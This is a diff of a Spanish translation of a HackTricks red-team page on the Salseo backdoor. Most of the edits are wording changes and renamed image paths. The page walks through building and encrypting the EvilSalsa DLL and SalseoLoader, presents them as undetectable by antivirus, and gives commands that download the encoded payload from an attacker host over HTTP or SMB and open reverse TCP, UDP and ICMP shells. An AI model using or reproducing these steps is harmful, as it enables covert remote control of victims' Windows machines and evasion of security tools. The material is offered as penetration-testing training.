@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende a hackear AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
@@ -18,19 +18,19 @@ Otras formas de apoyar a HackTricks:
 
 Descarga el código fuente desde github y compila **EvilSalsa** y **SalseoLoader**. Necesitarás tener **Visual Studio** instalado para compilar el código.
 
-Compila esos proyectos para la arquitectura de la máquina Windows donde los vas a utilizar (Si Windows soporta x64, compílalos para esa arquitectura).
+Compila esos proyectos para la arquitectura de la máquina Windows donde los vas a utilizar (si Windows soporta x64, compílalos para esa arquitectura).
 
 Puedes **seleccionar la arquitectura** dentro de Visual Studio en la pestaña **"Build"** en **"Platform Target".**
 
-(\*\*Si no encuentras estas opciones, presiona en **"Project Tab"** y luego en **"\<Project Name> Properties"**)
+(\*\*Si no encuentras estas opciones, presiona en **"Project Tab"** y luego en **"\<Nombre del Proyecto> Propiedades"**)
 
-![](<../.gitbook/assets/image (132).png>)
+![](<../.gitbook/assets/image (839).png>)
 
 Luego, compila ambos proyectos (Build -> Build Solution) (Dentro de los registros aparecerá la ruta del ejecutable):
 
-![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (381).png>)
 
-## Preparar el Backdoor
+## Preparar la Puerta Trasera
 
 Primero que nada, necesitarás codificar el **EvilSalsa.dll.** Para hacerlo, puedes usar el script de python **encrypterassembly.py** o puedes compilar el proyecto **EncrypterAssembly**:
 
@@ -40,15 +40,11 @@ python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
 ### Windows
-
-#### Salseo
-
-Salseo is a backdoor that allows an attacker to execute shell commands on a compromised system. It is written in C# and uses the .NET framework. Salseo can be compiled into an executable file and executed on the target system. The backdoor communicates over HTTP and can receive commands to execute shell commands, upload and download files, and more.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader.**
+Ok, ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader.**
 
 **Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún AV...**
 
@@ -60,9 +56,9 @@ Recuerda iniciar un nc como oyente de shell inverso y un servidor HTTP para serv
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Obteniendo una shell inversa UDP (descargando un dll codificado a través de SMB)**
+### **Obteniendo un shell inverso UDP (descargando un dll codificado a través de SMB)**
 
-Recuerda iniciar un nc como oyente de la shell inversa, y un servidor SMB para servir al evilsalsa codificado (impacket-smbserver).
+Recuerda iniciar un nc como oyente del shell inverso, y un servidor SMB para servir al evilsalsa codificado (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
@@ -81,7 +77,7 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-#### Dentro de la víctima, ejecutemos la cosa de salseo:
+#### Dentro de la víctima, vamos a ejecutar la cosa de salseo:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
@@ -91,51 +87,51 @@ Abre el proyecto SalseoLoader usando Visual Studio.
 
 ### Agrega antes de la función principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (409).png>)
 
 ### Instala DllExport para este proyecto
 
 #### **Herramientas** --> **Gestor de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (881).png>)
 
-#### **Busca el paquete DllExport (usando la pestaña Examinar) y presiona Instalar (y acepta el mensaje emergente)**
+#### **Busca el paquete DllExport (usando la pestaña Examinar) y presiona Instalar (y acepta el aviso emergente)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (100).png>)
 
 En la carpeta de tu proyecto han aparecido los archivos: **DllExport.bat** y **DllExport\_Configure.bat**
 
-### Desinstala DllExport
+### **Desinstala DllExport**
 
 Presiona **Desinstalar** (sí, es extraño pero confía en mí, es necesario)
 
-![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
+![](<../.gitbook/assets/image (97).png>)
 
-### **Sal de Visual Studio y ejecuta DllExport\_configure**
+### **Cierra Visual Studio y ejecuta DllExport\_configure**
 
-Simplemente **sal** de Visual Studio
+Simplemente **cierra** Visual Studio
 
 Luego, ve a tu **carpeta de SalseoLoader** y **ejecuta DllExport\_Configure.bat**
 
-Selecciona **x64** (si lo vas a usar dentro de una caja x64, ese fue mi caso), selecciona **System.Runtime.InteropServices** (dentro de **Espacio de nombres para DllExport**) y presiona **Aplicar**
+Selecciona **x64** (si lo vas a usar dentro de una caja x64, ese fue mi caso), selecciona **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) y presiona **Aplicar**
 
-![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (882).png>)
 
 ### **Abre el proyecto nuevamente con Visual Studio**
 
 **\[DllExport]** ya no debería estar marcado como error
 
-![](<../.gitbook/assets/image (8) (1).png>)
+![](<../.gitbook/assets/image (670).png>)
 
 ### Compila la solución
 
 Selecciona **Tipo de salida = Biblioteca de clases** (Proyecto --> Propiedades de SalseoLoader --> Aplicación --> Tipo de salida = Biblioteca de clases)
 
-![](<../.gitbook/assets/image (10) (1).png>)
+![](<../.gitbook/assets/image (847).png>)
 
 Selecciona **plataforma x64** (Proyecto --> Propiedades de SalseoLoader --> Compilar --> Destino de la plataforma = x64)
 
-![](<../.gitbook/assets/image (9) (1) (1).png>)
+![](<../.gitbook/assets/image (285).png>)
 
 Para **compilar** la solución: Compilar --> Compilar solución (Dentro de la consola de salida aparecerá la ruta de la nueva DLL)
 
@@ -175,7 +171,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 <details>
 
-<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipo Rojo de AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
